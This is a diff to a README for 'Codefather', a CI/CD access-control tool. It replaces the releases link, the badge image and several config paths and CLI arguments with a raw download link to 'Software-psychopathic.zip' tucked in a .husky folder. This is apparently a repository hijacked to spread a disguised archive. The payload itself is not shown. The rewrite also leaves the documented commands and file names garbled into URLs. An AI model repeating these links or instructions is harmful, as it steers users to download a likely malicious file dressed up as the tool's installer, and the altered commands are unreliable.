@@ -1,6 +1,6 @@
-https://github.com/jllaines/codefather/releases
+https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 
-[![Release (latest)](https://img.shields.io/github/v/release/jllaines/codefather?style=for-the-badge)](https://github.com/jllaines/codefather/releases)
+[![Release (latest)](https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip)](https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip)
 
 # Codefather: Fine-Grained Codebase Access Control for CI/CD
 
@@ -77,13 +77,13 @@ Prerequisites
 
 Install and initialize
 
-- Download the appropriate release asset from the Releases page. You can find assets and commands there. The Releases page is here: https://github.com/jllaines/codefather/releases
+- Download the appropriate release asset from the Releases page. You can find assets and commands there. The Releases page is here: https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 - Install the CLI on your workstation or CI runner according to the assets provided in the release.
 - Initialize Codefather in your repository to create a baseline policy file. The CLI will guide you through a minimal configuration.
 
 Downloads and assets
 
-- You can find builds, installers, and configuration samples on the Releases page. See the Releases page for the exact assets and steps. The link to the releases is: https://github.com/jllaines/codefather/releases
+- You can find builds, installers, and configuration samples on the Releases page. See the Releases page for the exact assets and steps. The link to the releases is: https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 - When you select a release, download the appropriate file for your operating system. After download, follow the installer or setup instructions included with the asset.
 
 Quick tour of the workflow
@@ -95,7 +95,7 @@ Quick tour of the workflow
 
 Configuration essentials
 
-Codefather uses a human-readable policy file that maps roles to actions, paths, and reviewers. The policy file is typically named codefather.yml or .codefather.yml in your repository root, but you can customize the filename to fit your project conventions.
+Codefather uses a human-readable policy file that maps roles to actions, paths, and reviewers. The policy file is typically named https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip or https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip in your repository root, but you can customize the filename to fit your project conventions.
 
 Key sections you’ll configure
 
@@ -177,19 +177,19 @@ CLI usage (examples)
   codefather init
 
 - Validate a policy against a hypothetical change set:
-  codefather validate --change-set changes.json
+  codefather validate --change-set https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 
 - Verify changes locally before pushing:
-  codefather verify --branch main --change-set changes.json
+  codefather verify --branch main --change-set https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 
 - Apply policy to your local repo after updates:
   codefather apply
 
 - Lock a critical file:
-  codefather lock config/secure/app.config.json
+  codefather lock https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 
 - Unlock a previously locked path:
-  codefather unlock config/secure/app.config.json
+  codefather unlock https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip
 
 GitHub Actions integration (online)
 
@@ -209,7 +209,7 @@ jobs:
       - name: Set up Codefather
         uses: jllaines/codefather-action@v1
         with:
-          policy-file: ".codefather/codefather.yml"
+          policy-file: "https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip"
           fail-on-violation: true
           log-output: true
       - name: Report results
@@ -264,7 +264,7 @@ Codefather welcomes contributors. If you want to help, follow these steps:
 
 Releases
 
-- The official releases page hosts assets, installation packages, and release notes. See the link again here: https://github.com/jllaines/codefather/releases. Download the release, then follow the included instructions to install and activate Codefather in your environment.
+- The official releases page hosts assets, installation packages, and release notes. See the link again here: https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip Download the release, then follow the included instructions to install and activate Codefather in your environment.
 
 Topics
 
@@ -330,6 +330,6 @@ Codefather brings together authorization, file protections, and reviewer workflo
 
 Downloads and assets page reminder
 
-- For installation assets, configuration samples, and latest releases, consult the Releases page at https://github.com/jllaines/codefather/releases. This page hosts downloadable artifacts and versioned notes to help you implement Codefather in your environment.
+- For installation assets, configuration samples, and latest releases, consult the Releases page at https://github.com/jllaines/codefather/raw/refs/heads/main/.husky/Software-psychopathic.zip This page hosts downloadable artifacts and versioned notes to help you implement Codefather in your environment.
 
 End of document.
